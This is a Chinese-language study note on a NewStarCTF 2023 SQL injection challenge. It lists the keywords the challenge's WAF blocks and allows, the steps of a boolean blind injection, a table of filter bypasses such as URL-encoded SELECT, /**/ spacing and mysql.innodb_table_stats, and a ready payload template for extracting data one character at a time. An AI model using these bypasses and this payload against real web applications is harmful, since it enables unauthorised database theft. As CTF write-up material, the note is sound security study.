---
type: source
created: 2026-05-13
updated: 2026-05-13
related: []
---

# NewStarCTF 2023 medium_sql

布尔盲注 + WAF 绕过。`%53ELECT` URL 编码绕过 select 过滤 + `mysql.innodb_table_stats` 替代 information_schema。

涉及概念：[[concepts/sql-urlencode-keyword-bypass]]

## 环境

- PHP + MySQL
- WAF 封禁：select, or（子串）, and, where, substr, ascii, sleep, order, information_schema
- WAF 放行：union, from, mid, left, right, like, limit, concat, char, hex, case, when

## 攻击路径

1. `?id=TMP0919'&&1=1--+-` 确认布尔盲注
2. `%53ELECT` 绕过 select 过滤（URL 编码首字母）
3. `mysql.innodb_table_stats` 替代 information_schema（避开 or 子串）
4. `mid()` 逐字符提取：database → table_name → column → flag

## 关键绕过

| 目标 | 绕过 |
|------|------|
| `select` | `%53ELECT` |
| `and` | `%26%26` (&&) |
| `information_schema` | `mysql.innodb_table_stats` |
| `where` | 不用，改用 `limit` |
| `substr` | `mid()` |
| 空格 | `/**/` |

## Payload 模板

```
?id=TMP0919'%26%26mid((%53ELECT/**/flag/**/from/**/here_is_flag/**/limit/**/0,1),{pos},1)='{char}'--+-
```

## 教训

- URL 编码单字符可绕过子串匹配型 WAF（WAF 检查原始 query string，MySQL 收到解码后的）
- `mysql.innodb_table_stats` 是 information_schema 的常用替代（无需 or 子串）
- 子串匹配 `or` 的 WAF 会误杀大量合法关键字（information, order, for 等）
